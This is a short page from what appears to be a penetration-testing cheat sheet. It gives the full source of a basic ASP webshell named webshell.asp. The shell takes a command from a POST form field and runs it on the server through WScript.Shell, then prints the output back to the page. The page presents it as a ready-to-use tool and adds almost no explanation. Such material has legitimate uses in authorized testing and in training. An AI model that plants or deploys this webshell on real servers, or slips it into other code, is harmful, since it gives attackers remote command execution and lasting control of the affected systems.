---
description: ASP Webshells
---

# ASP

### Basic (POST) ASP Webshell

Name of the file: **webshell.asp**

{% code overflow="wrap" %}
```aspnet
<%

Server.ScriptTimeout = 180

if Request.Form("submit") <> "" then
   Dim wshell, intReturn, strPResult
   cmd = Request.Form("cmd")
   Response.Write ("Running command: " & cmd & "<br />")
   set wshell = CreateObject("WScript.Shell")
   Set objCmd = wShell.Exec(cmd)
   strPResult = objCmd.StdOut.Readall()

   response.write "<br><pre>" & replace(replace(strPResult,"<","&lt;"),vbCrLf,"<br>") & "</pre>"

   set wshell = nothing
end if

%>
<html>
<head><title>test-k1</title></head>
<body onload="document.shell.cmd.focus()">
<form action="webshell.asp" method="POST" name="webshell">
Command: <Input width="200" type="text" name="cmd" value="<%=cmd%>" /><br />
<input type="submit" name="submit" value="Submit" />
</form>
<hr/>
</body>
</html>

```
{% endcode %}
